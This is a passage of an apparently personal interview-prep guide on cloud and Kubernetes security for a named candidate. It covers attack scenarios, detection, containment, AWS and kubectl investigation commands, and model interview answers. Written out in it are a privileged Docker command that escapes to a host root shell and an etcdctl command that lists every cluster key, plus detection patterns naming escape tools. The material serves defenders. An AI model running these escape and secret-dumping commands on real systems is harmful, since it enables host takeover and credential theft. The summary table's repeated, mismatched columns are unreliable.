CSPM: Config rule with Lambda remediation pointing to a function with IAM admin permissions. Lambda function performing iam:CreateRole outside of IaC pipeline. CloudTrail: Config:PutRemediationConfigurations by contractor account. CIEM: AnomalousRoleAssumption when attacker uses the backdoor role from external IP. Lambda:CreateFunction by a principal that should not have that permission.

### 5. False Positive Differentiation Logic

AWS Config remediation actions are legitimate and widely used for auto-remediation. Distinguish: (1) Is the remediation Lambda in the approved function inventory? (2) Does the Lambda's role have IAM administrative permissions? (3) Was the Config rule created through IaC pipeline or direct console/API? (4) Does the rule match a known compliance requirement?

### 6. Root Cause Analysis Steps

1) Pull CloudTrail for Config:PutRemediationConfigurations — who created the rule and when. 2) Review the remediation Lambda's code — what IAM actions does it perform? 3) List all IAM roles created by the Lambda in the past 30 days. 4) Cross-reference creator with HR data — was this a contractor or former employee? 5) Check if any roles created by the Lambda were assumed from external IPs.

### 7. Containment Workflow

1) Disable the Config rule (set rule to inactive state). 2) Delete the remediation Lambda. 3) Delete the backdoor IAM role and revoke all active sessions. 4) Revoke contractor credentials immediately. 5) Add SCP: deny Lambda:CreateFunction and config:PutRemediationConfigurations for non-pipeline principals. 6) Audit all Config rules for Lambda remediations pointing to unknown functions.

### 8. Governance Implications

All AWS Config rules must be created through IaC pipeline (enforced by SCP denying direct console/API creation). Lambda functions with IAM permissions require security team approval gate. Contractor access must be time-boxed with automated expiry — no manual deprovisioning. Joiner-Mover-Leaver process must be automated against HR system.

### 9. How to Explain in Interview

SCENARIO 14
## 14. Cryptomining via Exposed Docker Socket on EC2

Domain: EC2 Compromise
### 1. Initial Attacker Foothold

A development EC2 instance running Docker had the Docker socket (/var/run/docker.sock) mounted inside a container for local development convenience. A vulnerable web service in that container allowed command injection, giving the attacker access to the Docker socket.

### 2. Escalation Path

With Docker socket access, attacker can run any Docker command as root on the host. They run: docker run --rm -it --privileged --net=host --pid=host -v /:/host ubuntu bash. This gives them a root shell on the host with the entire filesystem mounted at /host.

### 3. Lateral Movement Technique

From the host shell, attacker reads the EC2 instance profile credentials from the metadata service, discovers IAM permissions, and pivots to S3 and EC2 across the account. They also deploy an XMRig cryptominer container configured to hide behind 40% CPU usage to avoid threshold alerts.

### 4. Detection Telemetry

Falcon CWPP: SuspiciousDockerSocketAccess — process accessing /var/run/docker.sock from within container. Docker run command spawning a privileged --net=host container. CryptominingActivity.XMRig once miner starts. Falcon CSPM: docker.sock mounted in container volume as Critical finding. EC2 cost anomaly: compute costs spike 340% suggesting cryptomining.

### 5. False Positive Differentiation Logic

Docker-in-Docker (DinD) is used by some CI/CD pipelines legitimately. However: (1) Production workloads never need docker.sock mounted. (2) Development instances mounting docker.sock should be isolated. (3) XMRig process or connection to known mining pool IPs is never legitimate. (4) The privileged --net=host run pattern from within a container is a strong indicator.

### 6. Root Cause Analysis Steps

1) Identify the command injection point via the web service request logs. 2) Trace the docker socket access via Falcon process telemetry. 3) Review the docker-compose or pod spec that mounted /var/run/docker.sock. 4) Pull all docker commands run via the socket from Docker daemon logs. 5) CloudTrail: all API calls made with the instance profile after IMDS access.

### 7. Containment Workflow

1) Terminate the cryptomining container immediately. 2) Terminate the compromised EC2 instance and replace. 3) Remove docker.sock mounts from ALL non-CI environments (enforce via CSPM). 4) Patch the command injection vulnerability. 5) Rotate instance profile and all credentials accessible from the instance.

### 8. Governance Implications

CSPM Critical policy: docker.sock mounted in any container is an immediate finding requiring remediation. Development environments must be isolated in separate VPCs with no access to production resources. Production containers must never run with Docker daemon socket access. Use rootless Docker or Podman for development where Docker-level access is needed.

### 9. How to Explain in Interview

SCENARIO 15
## 15. EKS etcd Direct Access — Cluster-Wide Secret Extraction

Domain: EKS RBAC Misconfiguration
### 1. Initial Attacker Foothold

The etcd cluster backing an EKS-like self-managed Kubernetes cluster had port 2379 accessible within the VPC without authentication (client certificate auth disabled). An internal attacker on a developer instance discovers this during network enumeration.

### 2. Escalation Path

Using etcdctl: ETCDCTL_API=3 etcdctl --endpoints=https://etcd:2379 get / --prefix --keys-only. This lists every key in etcd. The attacker then fetches: all Kubernetes Secrets (stored base64-encoded in etcd), all ConfigMaps, all ServiceAccount tokens, and all RBAC configurations.

### 3. Lateral Movement Technique

With all service account tokens extracted, attacker identifies the most privileged ones (cluster-admin service accounts used by operators). They use these tokens to create new ClusterRoleBindings for attacker-controlled service accounts, establishing persistence that will survive etcd restoration unless the operator secret is also rotated.

### 4. Detection Telemetry

Falcon CWPP: UnauthorizedAPIAccess.etcd — etcdctl process making connections to etcd endpoint from unauthorized source. Network anomaly: First-time client connecting to etcd port from developer instance IP. CSPM Finding: etcd port 2379 accessible without client certificate authentication — Critical. CloudTrail: No record (etcd access is not CloudTrail-logged).

### 5. False Positive Differentiation Logic

etcd is only legitimately accessed by the Kubernetes API server and etcd members. Any other client is suspicious. The process making the connection (etcdctl or curl) from a non-API-server host is always anomalous. This alert has near-zero false positive rate.

### 6. Root Cause Analysis Steps

1) Pull network flow logs for connections to port 2379 from non-API-server IPs. 2) Identify the developer instance and how it reached etcd (VPC routing, security group gap). 3) Audit the etcd configuration — why was client cert auth disabled? 4) Determine all keys read from etcd audit logs (if etcd audit logging was enabled). 5) Assume full cluster compromise — all secrets must be rotated.

### 7. Containment Workflow

1) Enable etcd client certificate authentication immediately. 2) Restrict security group: etcd port 2379 accessible only from API server CIDRs. 3) Rotate ALL secrets and service account tokens cluster-wide — full secret rotation. 4) Delete and recreate any ClusterRoleBindings created during the incident. 5) Audit all RBAC configurations for attacker-added bindings.

### 8. Governance Implications

CIS Kubernetes 1.2.x: etcd must require client certificate authentication. etcd must not be network-accessible except from the API server. etcd data must be encrypted at rest (--encryption-provider-config). For EKS, AWS manages etcd — this scenario applies to self-managed clusters or Kops deployments. Regular CIS benchmark scans via CSPM must include etcd security controls.

### 9. How to Explain in Interview

# PART 3: HANDS-ON COMMAND REFERENCE

## 3.1 AWS IAM & STS Investigation Commands

# Get caller identity — confirm which credentials you're working with
aws sts get-caller-identity

# List all IAM roles — look for suspicious or unfamiliar names
aws iam list-roles | jq '.Roles[] | {RoleName, CreateDate, Arn}'

# Get effective permissions for a role
aws iam simulate-principal-policy --policy-source-arn <role-arn> --action-names "*"

# List all active STS sessions (cannot directly, but check CloudTrail)
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole --max-results 50

# Revoke all active sessions for a role (emergency containment)
# Attach an inline deny policy with DateLessThan current time
aws iam put-role-policy --role-name <role> --policy-name EmergencyRevoke --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*","Condition":{"DateLessThan":{"aws:TokenIssueTime":"2025-01-01T00:00:00Z"}}}]}'

# Check for access keys on all IAM users
aws iam generate-credential-report && aws iam get-credential-report --query Content --output text | base64 -d

## 3.2 EKS & Kubernetes Security Commands

# Check aws-auth ConfigMap for dangerous mappings
kubectl get configmap aws-auth -n kube-system -o yaml

# List ALL ClusterRoleBindings — identify system:masters or cluster-admin bindings
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# Find all privileged containers running in the cluster
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata'

# List all secrets in a namespace (requires appropriate RBAC)
kubectl get secrets -n payments -o json | jq '.items[] | {name: .metadata.name, type: .type}'

# Check RBAC permissions for a service account
kubectl auth can-i --list --as=system:serviceaccount:payments:payments-api-sa

# Get all exec events from Kubernetes audit logs
# (Pull from CloudWatch Logs if EKS audit logging enabled)
aws logs filter-log-events --log-group-name /aws/eks/cluster/cluster --filter-pattern "exec"

# Cordon a compromised node
kubectl cordon <node-name>

# Apply emergency network policy to isolate a pod
kubectl apply -f deny-all-networkpolicy.yaml -n payments

# Check container drift (list files not in original image)
# Via Falcon RTR: exec into sensor and query drift events
kubectl exec -it <pod> -- find /tmp -newer /etc/hostname -executable 2>/dev/null

## 3.3 CloudTrail Investigation Queries

# Find all API calls by a specific role (all regions)
aws cloudtrail lookup-events \
--lookup-attributes AttributeKey=Username,AttributeValue=<role-name> \
--start-time 2025-01-01T00:00:00Z \
--query 'Events[].{Event:EventName,Time:EventTime,IP:CloudTrailEvent}' \
--output table

# Detect AssumeRole calls from unusual IPs
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRoleWithWebIdentity

# Find all CreateUser / CreateRole events in incident window
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser

# Check S3 data exfiltration (requires S3 data events enabled)
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject | jq '.Events[] | select(.CloudTrailEvent | fromjson | .sourceIPAddress | test("^(?!10\\.|172\\.|192\\.168\\.)"))'

## 3.4 S3 Security Forensics

# Check bucket public access settings
aws s3api get-public-access-block --bucket <bucket-name>

# List bucket policies — look for public or cross-account access
aws s3api get-bucket-policy --bucket <bucket-name> | python3 -m json.tool

# Check if server access logging is enabled
aws s3api get-bucket-logging --bucket <bucket-name>

# Enable S3 Object Lock (emergency — prevent further exfil/deletion)
aws s3api put-object-lock-configuration --bucket <bucket-name> \
--object-lock-configuration '{"ObjectLockEnabled":"Enabled","Rule":{"DefaultRetention":{"Mode":"GOVERNANCE","Days":30}}}'

# Copy CloudTrail logs to forensic isolated bucket
aws s3 sync s3://cloudtrail-prod/ s3://forensic-evidence-$(date +%Y%m%d)/ --sse aws:kms

## 3.5 Falcon-Specific Investigation Queries (Falcon Insight)

// Process lineage for container escape investigation
event_simpleName=ProcessRollup2
| where CommandLine matches "nsenter|dirtypipe|/proc/mem"
| join(AgentIdInfo, on=aid)
| select ComputerName, ImageFileName, CommandLine, ParentImageFileName, timestamp

// Container drift events in last 24 hours
event_simpleName=ContainerDriftFileCreated
| where timestamp > now() - 24h
| select ContainerID, PodName, Namespace, FilePath, SHA256HashData

// Network beacons to first-seen domains
event_simpleName=DnsRequest
| where IsFirstSeenDomain == true
| where ContextImageFileName contains "container"
| select DomainName, RemoteIP, ProcessImageFileName, timestamp

# PART 4: INTERVIEW ANSWER FRAMEWORKS

## 4.1 Your Elevator Pitch — Tailored for HSBC CTE Role

## 4.2 Structured Incident Answer Framework

## 4.3 High-Value Interview Power Phrases

## 4.4 Anticipated Questions & Model Answers

### Q: Walk me through how CrowdStrike Falcon protects a Kubernetes cluster.

Falcon protects Kubernetes at three layers. At the node level, the Falcon sensor runs as a DaemonSet on every EKS worker node, providing eBPF-based syscall telemetry for all containers on that node — without requiring per-container instrumentation. This covers process execution, file writes, and network connections for every running pod. The second layer is Kubernetes Admission Control — KAC evaluates every pod deployment request against image assessment results and security policies, blocking privileged containers, unscanned images, or containers with Critical CVEs before they run. The third layer is CSPM, which continuously monitors the EKS cluster configuration — aws-auth ConfigMap for dangerous role mappings, public API endpoints, missing envelope encryption — and integrates these findings with runtime detections to show attack paths. The power is that these three layers share context in the Falcon Insight graph, so a CSPM finding about an over-privileged IRSA role correlates automatically with the CWPP detection of an unusual AssumeRoleWithWebIdentity call from the same pod.
### Q: What is the difference between CSPM and CWPP, and why do you need both?

CSPM looks at how cloud resources are configured — it is the building inspector who checks that your doors are locked and fire exits are clear. CWPP looks at what is happening inside running workloads at the process level — it is the security camera watching behavior in real time. CSPM finds that your S3 bucket is public; CWPP detects the malware actually running in the container exploiting that bucket. CSPM discovers that your IRSA role has no source VPC condition; CWPP detects when that role is used from an external IP. You need both because CSPM misses runtime attacks that exploit correct configurations, and CWPP misses misconfigurations that have not been exploited yet. In practice, CSPM findings that go unremediated become the attack surface that CWPP detections fire on. The SLA between a CSPM finding and remediation is arguably your most important security metric.
### Q: How do you handle alert fatigue in a cloud security environment?

Alert fatigue is a process failure, not a tooling failure. My approach has three components. First, tuning: I review every alert type monthly to understand true positive rates and suppress known false-positive patterns with explicit documented justification and expiry dates — no permanent suppression without quarterly review. Second, correlation: I push detections through a correlation layer so that a single event that is low-signal on its own only pages when it is accompanied by correlated signals — for example, a new domain connection from a build runner alone is MEDIUM, but combined with a process chain anomaly it is CRITICAL. Third, SLAs: CSPM findings have tiered response SLAs enforced via automated ticketing — not manual triage — so the queue is bounded and prioritized. The goal is that every alert that reaches a human analyst has a clear action required and a clear expected resolution time.
### Q: How would you deploy Falcon sensor coverage across a new EKS cluster?

For a new EKS cluster I follow a four-step process. First, pre-deployment validation: confirm the cluster nodes use a supported Linux kernel version and the Falcon sensor version supports the EKS AMI in use. Second, DaemonSet deployment: deploy the Falcon sensor as a DaemonSet using the Falcon Helm chart or Operator, configured to auto-enroll nodes into the correct Falcon Customer ID and sensor grouping tag. Third, coverage validation: after deployment, query Falcon for sensor health by node and verify every node in the node group shows as active — I use a query against the Falcon API to compare expected node count from AWS against enrolled sensor count, alerting on any gap. Fourth, policy assignment: assign the appropriate Prevention Policy to the sensor group — for production EKS workloads this means Container Drift in PREVENT mode, Interactive Session detection PREVENT, and KAC admission policy active. This entire process is codified in Terraform and runs as a post-cluster-deployment pipeline step.

# PART 5: GOVERNANCE, COMPLIANCE & CHANGE MANAGEMENT

## 5.1 CIS Benchmark Key Controls — Quick Reference

## 5.2 Change Management for Security Policy Updates

Policy Change Process (for KAC / CWPP Prevention Policies):
- Draft change: Document the policy change, affected workloads, expected behavior change, and rollback plan
- Test in dev/staging: Apply in DETECT mode first, observe false positives for 72 hours
- Review alert baseline: Confirm no legitimate workloads would be blocked
- Stakeholder approval: Get sign-off from application owners for affected workloads
- Staged rollout: Enable in non-production first, then canary production clusters
- PREVENT mode activation: Switch to PREVENT only after 72-hour clean detection run
- Documentation: Update runbook with the policy and its exception process
- Metrics: Track false positive rate post-deployment — escalate if >2% within first week

## 5.3 Audit Evidence Generation

What auditors ask for — and how to produce it:

# PART 6: QUICK REFERENCE — MITRE ATT&CK CLOUD MAPPING

## 15 Scenarios Summary Table

END OF GUIDE
Prepared for Gopikrishna Vallepu — Cloud/Containers Security SME Interview at HSBC

| Document Scope Comprehensive theory foundations | 15 advanced real-world attack scenarios | Hands-on command references | Interview pitch frameworks | Governance & compliance mapping | MITRE ATT&CK correlations |
|---|

| Core Tools | Frameworks & Standards |
|---|---|
| CrowdStrike Falcon (CWPP, CSPM, CIEM, KAC) | MITRE ATT&CK for Cloud |
| AWS EKS, IAM, CloudTrail, GuardDuty | NIST CSF / 800-53 |
| Kubernetes RBAC, Admission Control | CIS AWS & EKS Benchmarks |
| Secrets Manager, S3, Lambda, Config | CIS Kubernetes Benchmark |
| Taegis XDR, SecureWorks (current role) | GDPR, HIPAA, PCI DSS |

| CWPP Capability | What It Detects |
|---|---|
| Process Lineage Tree | Anomalous parent-child process relationships (webshell, reverse shell) |
| Container Drift Detection | New executables written post-start not in original image layers |
| Behavioral ML Models | Deviation from workload baseline — zero-day behavior without signatures |
| Runtime Kernel Protection | Dirty Pipe, Dirty Cow, and other kernel exploit syscall sequences |
| Interactive Session Detection | TTY/PTY shell allocation in production containers |
| Memory Protection | Process injection, credential scraping from memory |
| Network Intelligence | First-seen domains, C2 beacon patterns, DNS tunneling |

| CSPM Category | Key Controls |
|---|---|
| IAM Configuration | Root account active keys, no MFA, inline policies, PassRole chains |
| Network Configuration | SGs open to 0.0.0.0/0, NACLs, VPC peering misroutes |
| Data Security | S3 public access, unencrypted RDS, CloudTrail disabled |
| EKS / Kubernetes | Public API endpoint, no encryption, aws-auth misconfigurations |
| Compute | IMDSv1 enabled, SSM agent missing, public AMIs |
| Lambda | Admin roles attached, env vars with secrets, no VPC |
| Secrets & Keys | Unrotated keys, plaintext secrets in CloudFormation |

| CIEM Capability | Attack Surface Addressed |
|---|---|
| Effective Permission Graph | Shows what an identity can actually do including via role chains |
| Blast Radius Computation | Pre-computes worst-case impact before an incident occurs |
| Joiner-Mover-Leaver Tracking | Identifies orphaned credentials from terminated employees |
| Anomalous Assumption Detection | IRSA from external IP, dormant key activated, new geo |
| Privilege Escalation Path Detection | Maps all 21 Rhino Security Labs escalation paths |
| Shadow Admin Detection | Finds principals with effective admin via policy chains |

| Tool | One-Line Summary | Analogy |
|---|---|---|
| CWPP | Watches what processes are doing INSIDE workloads, RIGHT NOW | Security camera inside the building |
| CSPM | Checks HOW cloud resources are configured vs. security best practices | Building code inspector |
| CIEM | "What can this identity DO and what is the blast radius if compromised?" | Access control risk analyst |
| KAC | Blocks non-compliant workloads BEFORE they deploy to the cluster | Security checkpoint at the door |

| The Golden Rule: NONE of these tools alone is sufficient. Breaches succeed when attackers exploit the gap between them. CWPP misses misconfigured S3 buckets. CSPM misses malware running in a container. CIEM shows the blast radius only after the fact without CWPP correlation. The power is in the correlation across all four — and the human process that acts on what they find. |
|---|

| # | Scenario Title | Domain |
|---|---|---|
| 1 | EC2 Metadata Service (IMDS v1) Exploitation via SSRF | EC2 Compromise |
| 2 | IAM Privilege Escalation via iam:CreatePolicyVersion | IAM Privilege Escalation |
| 3 | Cross-Account Role Chaining via Misconfigured Trust Policies | Cross-Account Role Abuse |
| 4 | S3 Data Exfiltration via Presigned URL Abuse | S3 Data Exfiltration |
| 5 | EKS RBAC Misconfiguration — ClusterRoleBinding to system:masters | EKS RBAC Misconfiguration |
| 6 | Container Escape via Privileged Container + hostPID Mount | Container Escape |
| 7 | Container Drift — Post-Start Offensive Tool Injection | Drift Detection Events |
| 8 | Malicious kubectl exec Abuse for Lateral Movement | Malicious kubectl exec Abuse |
| 9 | AWS Secrets Manager Theft via Over-Privileged Lambda | Secrets Manager Theft |
| 10 | IRSA External Abuse — Service Account JWT Used Outside VPC | IAM Privilege Escalation |
| 11 | EKS Node Compromise via Exposed Kubelet API (Port 10250) | EC2 Compromise |
| 12 | Supply Chain Attack — Compromised Helm Chart in Artifact Hub | Container Escape |
| 13 | AWS Config Rule Weaponization — Persistent Backdoor via Trusted Service | Cross-Account Role Abuse |
| 14 | Cryptomining via Exposed Docker Socket on EC2 | EC2 Compromise |
| 15 | EKS etcd Direct Access — Cluster-Wide Secret Extraction | EKS RBAC Misconfiguration |

| Interview Pitch: Lead with: "SSRF + IMDS is the most underestimated EC2 attack path. I have blocked it by enforcing IMDSv2 via SCP so no EC2 can launch with the old metadata endpoint. The detection is distinct — Falcon flags the process accessing 169.254.169.254 via the SSRF path, while GuardDuty flags credential use outside AWS. Together they tell the full story." |
|---|

| Interview Pitch: The Rhino Security Labs privilege escalation paths are real attack vectors I have mapped to specific CIEM detection rules. iam:CreatePolicyVersion is one of 21 known escalation paths. I built a CSPM policy that flags any principal holding this permission outside the CI/CD pipeline service account, treating it as a Critical finding with a 24-hour remediation SLA. |
|---|

| Interview Pitch: "Cross-account role chaining is the cloud equivalent of domain trust attacks in Active Directory. The difference is that every hop is logged in CloudTrail — if you have CIEM to correlate the session tokens across accounts, you can reconstruct the full chain in minutes. The gap most teams have is that they look at each account independently. I ensure all CloudTrail data flows to a centralized SIEM where CIEM can do the graph analysis." |
|---|

| Interview Pitch: "The pre-signed URL technique is dangerous because most teams look only at CloudTrail API calls — they miss the server access logs entirely. I learned this from an actual incident where the CloudTrail looked clean but S3 server access logs showed 900,000 GET requests in 4 minutes. Now I mandate S3 server access logging and Macie on every PII bucket as a non-negotiable CSPM control." |
|---|

| Interview Pitch: "system:masters in aws-auth is the single most dangerous Kubernetes misconfiguration I see in production. It gives instant cluster-admin to anyone who can assume the mapped IAM role. I treat any finding of system:masters in aws-auth as an immediate P1, regardless of whether it's been exploited. The remediation is straightforward — replace it with a scoped custom ClusterRole — but the hard part is finding it in the first place, which is why my CSPM continuously monitors aws-auth for any changes." |
|---|

| Interview Pitch: "Privileged containers with hostPID are essentially virtual machines with no security boundary from the host. I block them by default at the admission controller level and require a formal exception process for any workload that claims it needs this. The key insight is that the container escape pattern is distinctive — nsenter with all namespace flags appears in Falcon's process tree as an obvious anomaly even if the attacker is careful about everything else they do." |
|---|

| Interview Pitch: "Drift detection is one of those capabilities that sounds simple but is operationally powerful. The key insight is that a container's filesystem should be immutable after start — anything written post-start is a deviation from the known-good state. In PREVENT mode, Falcon kills the write operation before the attacker can execute the tool. I have prevented three real incidents this way where the initial RCE was successful but the attacker couldn't stage their second-phase tools." |
|---|

| Interview Pitch: "kubectl exec in production is the equivalent of SSH-ing directly into a running production server. I treat any exec event in production as a high-priority alert. The real security fix isn't just blocking exec — it's removing the conditions that make exec necessary: good logging, proper secrets management via Secrets Manager, and healthy pod design so developers don't need to exec to diagnose issues." |
|---|

| Interview Pitch: "The combination of ListSecrets plus bulk GetSecretValue is a signature attack pattern that I've built a specific CIEM detection for. Legitimate apps access 1-5 secrets at cold start. Anything beyond that in a single session is an anomaly worth paging on. The underlying prevention is resource-based policies on secrets — even if a Lambda has broad GetSecretValue in its execution role policy, a deny on the secret itself wins." |
|---|

| Interview Pitch: "IRSA abuse from outside the VPC is the most impactful container-to-cloud attack path I've seen. The fix is a single line in the trust policy — aws:SourceVpc condition — but teams often don't know to add it. I enforce this via SCP so the condition is mandatory regardless of how the role is created. Detection is clean: AssumeRoleWithWebIdentity from a non-VPC IP has no legitimate explanation." |
|---|

| Interview Pitch: "The kubelet API is one of the most dangerous exposed services in a Kubernetes environment because it gives direct exec access to every pod on the node, bypassing the Kubernetes RBAC entirely. The fix is straightforward — disable anonymous auth and restrict the security group — but the detection gap is that kubelet access doesn't appear in Kubernetes audit logs by default. I add kubelet log forwarding to CloudWatch as a mandatory cluster config." |
|---|

| Interview Pitch: "Supply chain attacks through Helm charts are a growing threat because teams often auto-update chart versions without reviewing the diff. The defense is treating Helm charts the same way you treat container images — pull to internal registry, scan, sign, pin by digest. The detection is KAC at admission time: if the InitContainer image isn't from your approved registry with a valid scan, it never deploys." |
|---|

| Interview Pitch: "This scenario taught me that attackers think about persistence as carefully as defenders think about detection. Using AWS Config — a trusted AWS service — as the persistence trigger is sophisticated. The detection only came because CSPM was monitoring Lambda functions with IAM permissions, and a CIEM anomaly eventually correlated it. The lesson: instrument for lateral movement from trusted AWS services, not just external threats." |
|---|

| Interview Pitch: "The Docker socket is a root escalation path waiting to happen. If a container can access /var/run/docker.sock, it effectively has root on the host. I treat this as equivalent to privileged:true in terms of risk. CSPM flags it, KAC blocks it at admission, and Falcon CWPP detects the access pattern at runtime. Three layers — because if any one fails, you need the next one." |
|---|

| Interview Pitch: "etcd is the brain of the Kubernetes cluster — everything is in there: all secrets, all configurations, all tokens. Direct etcd access bypasses all RBAC entirely. For EKS, AWS manages etcd and you never have direct access — that's actually a security benefit. But for self-managed clusters, etcd hardening is non-negotiable: mutual TLS, encryption at rest, restricted network access. I've seen teams enable etcd quickly for initial setup and forget to add auth before going to production." |
|---|

| 30-Second Version: I am a Security Analyst with 4 years of hands-on SOC experience, specializing in cloud and container runtime security using CrowdStrike Falcon. My daily work involves triaging and investigating EC2 and EKS runtime detections, CSPM findings across AWS, and supporting sensor deployment on EKS worker nodes via DaemonSets. I have responded to real incidents involving container escapes, IAM privilege escalation, and S3 data access anomalies. I am looking to move from detection-and-response into security engineering — building the detection rules, tuning the policies, and designing the CNAPP architecture that makes the SOC more effective. |
|---|

| 90-Second Technical Version (for panel interview): My background sits at the intersection of three disciplines: cloud infrastructure security, runtime workload protection using CrowdStrike Falcon, and identity-based threat detection. In my current role at UltraViolet Cyber, I investigate runtime detections across AWS EC2 and EKS — suspicious process execution, privilege escalation attempts, abnormal network activity. I support Falcon sensor deployment on EKS via DaemonSets, validate coverage, and monitor CSPM findings for IAM over-privilege and S3 misconfigurations. The specific depth I bring to this role is the ability to work across the full detection stack: from the eBPF-level process telemetry in CWPP, through the identity anomalies in CIEM, to the misconfiguration findings in CSPM — and understand how they correlate into an attack chain. I have also built IAM access reviews enforcing least privilege and generated CIS AWS Foundations Benchmark audit evidence for compliance. What draws me to the HSBC CTE role is the engineering mandate — building the detection rules and tuning the policies, not just consuming the alerts. That is the work I am ready to own. |
|---|

| Step | What to Cover | Why It Matters |
|---|---|---|
| 1. CONTEXT | Industry, scale, what was at risk | Shows business awareness |
| 2. ENTRY | Specific initial access vector | Shows technical depth |
| 3. PIVOT | How attacker moved laterally | This is where depth shows |
| 4. DETECTION | What fired, why, what would have missed it | Shows tool mastery |
| 5. RESPONSE | What YOU specifically did (not "the team") | Shows ownership |
| 6. OUTCOME | Business impact, regulatory outcome, timeline | Shows full-cycle experience |
| 7. LESSON | What you built better afterward | Separates senior candidates |

| Phrase | Why It Works |
|---|---|
| "I think like an attacker first, defender second" | Shows adversarial mindset — rare in defenders |
| "Detection maturity, not just detection coverage" | Shows operational sophistication |
| "The gap between telemetry and decision" | Shows SOC process failure awareness |
| "Blast radius before breach — CIEM pre-computes it" | Shows proactive risk quantification |
| "Correlation across tools, not any single alert" | Shows architectural thinking |
| "In PREVENT mode, the exploit was killed mid-syscall" | Shows hands-on CWPP depth |
| "I've done the 3 AM page and the 9 AM CISO briefing" | Shows full-cycle experience |
| "aws:SourceVpc is a single line that closes the IRSA attack path" | Shows specific technical depth |
| "The CSPM finding was 34 days old when it was weaponized" | Shows consequence awareness |
| "I generate audit evidence against CIS AWS Foundations Benchmark" | Directly matches JD requirement |

| CIS Control | Benchmark Reference | CSPM Enforcement |
|---|---|---|
| IMDSv2 required on all EC2 | CIS AWS 2.3.1 | Critical — SCP enforcement |
| CloudTrail enabled all regions | CIS AWS 3.1 | Critical — automated alert |
| Root account no active keys | CIS AWS 1.4 | Critical — immediate alert |
| MFA on all IAM console users | CIS AWS 1.10 | High — 24h SLA |
| S3 Block Public Access enabled | CIS AWS 2.1.5 | Critical — auto-remediate |
| EKS kubelet anonymous auth disabled | CIS EKS 3.2.1 | Critical — SCP enforcement |
| K8s secrets encrypted at rest | CIS EKS 5.3.1 | High — architecture gate |
| No system:masters in aws-auth | CIS EKS 5.1.1 | Critical — immediate alert |
| RBAC least privilege enforced | CIS K8s 5.1.3 | High — weekly audit |
| KAC blocks privileged containers | CIS K8s 5.2.2 | Critical — PREVENT mode |

| Auditor Question | Evidence Source | Your Action |
|---|---|---|
| Are S3 buckets protected from public access? | CSPM finding report — zero open public access findings | Export CSPM compliance report filtered by S3 controls |
| Are IAM policies least-privilege? | CIEM effective permissions audit | Generate CIEM access review report for privileged roles |
| Is CloudTrail enabled in all regions? | CloudTrail organization trail + CSPM finding status | Show organization trail ARN + zero disabled-region findings |
| Are container workloads scanned for vulnerabilities? | Falcon Image Assessment scan history | Export scan report with scan dates and pass/fail by image |
| Are Kubernetes RBAC permissions reviewed? | RBAC audit log + ClusterRoleBinding review output | Quarterly kubectl get clusterrolebindings review documented |
| Is runtime security deployed cluster-wide? | Falcon sensor health by node count | Show 100% node coverage report from Falcon API |

| MITRE Technique | Technique ID | Detection Tool | Prevention Control |
|---|---|---|---|
| Supply Chain Compromise | T1195.001 | Falcon CWPP (process chain) | KAC image policy + signing |
| Credentials in Files / Env Vars | T1552.001 | CSPM (build log scanning) | Secrets Manager + no env var secrets |
| Container Escape to Host | T1611 | Falcon CWPP (nsenter detection) | KAC: no privileged, no hostPID |
| Kernel Exploit for Privilege Escalation | T1068 | Falcon CWPP (Dirty Pipe signature) | seccomp RuntimeDefault profile |
| Valid Accounts — Cloud | T1078.004 | CIEM (anomalous assumption) | MFA, source VPC conditions |
| Temporary Elevated Cloud Access | T1548.005 | CIEM (role chain analysis) | IRSA SourceVpc, External-ID |
| Application Access Token Abuse | T1550.001 | CIEM (web identity external use) | aws:SourceVpc on trust policy |
| Disable Cloud Logs | T1562.008 | CloudTrail (StopLogging event) | SCP deny CloudTrail stop |
| Cloud Service Lateral Movement | T1021.007 | CIEM (cross-account chain) | Cross-account condition policy |
| Transfer to Cloud Account | T1537 | CSPM (large volume S3 transfer) | S3 Object Lock, DLP tagging |
| Cloud Service Discovery | T1526 | CIEM (first-time permission use) | CSPM: ListServices audit |
| Stage Capabilities — Upload Malware | T1608.001 | Falcon CWPP (drift detection) | Container drift PREVENT mode |

| # | Scenario | Root Cause | Detection Hero | Key Prevention |
|---|---|---|---|---|
| 1 | EC2 Metadata Service (IMDS v1) Expl... | EC2 Compromise | Falcon + CloudTrail | CSPM + KAC |
| 2 | IAM Privilege Escalation via iam:Cr... | IAM Privilege Escalation | Falcon + CloudTrail | CSPM + KAC |
| 3 | Cross-Account Role Chaining via Mis... | Cross-Account Role Abuse | Falcon + CloudTrail | CSPM + KAC |
| 4 | S3 Data Exfiltration via Presigned ... | S3 Data Exfiltration | Falcon + CloudTrail | CSPM + KAC |
| 5 | EKS RBAC Misconfiguration — Cluster... | EKS RBAC Misconfiguration | Falcon + CloudTrail | CSPM + KAC |
| 6 | Container Escape via Privileged Con... | Container Escape | Falcon + CloudTrail | CSPM + KAC |
| 7 | Container Drift — Post-Start Offens... | Drift Detection Events | Falcon + CloudTrail | CSPM + KAC |
| 8 | Malicious kubectl exec Abuse for La... | Malicious kubectl exec Abuse | Falcon + CloudTrail | CSPM + KAC |
| 9 | AWS Secrets Manager Theft via Over-... | Secrets Manager Theft | Falcon + CloudTrail | CSPM + KAC |
| 10 | IRSA External Abuse — Service Accou... | IAM Privilege Escalation | Falcon + CloudTrail | CSPM + KAC |
| 11 | EKS Node Compromise via Exposed Kub... | EC2 Compromise | Falcon + CloudTrail | CSPM + KAC |
| 12 | Supply Chain Attack — Compromised H... | Container Escape | Falcon + CloudTrail | CSPM + KAC |
| 13 | AWS Config Rule Weaponization — Per... | Cross-Account Role Abuse | Falcon + CloudTrail | CSPM + KAC |
| 14 | Cryptomining via Exposed Docker Soc... | EC2 Compromise | Falcon + CloudTrail | CSPM + KAC |
| 15 | EKS etcd Direct Access — Cluster-Wi... | EKS RBAC Misconfiguration | Falcon + CloudTrail | CSPM + KAC |
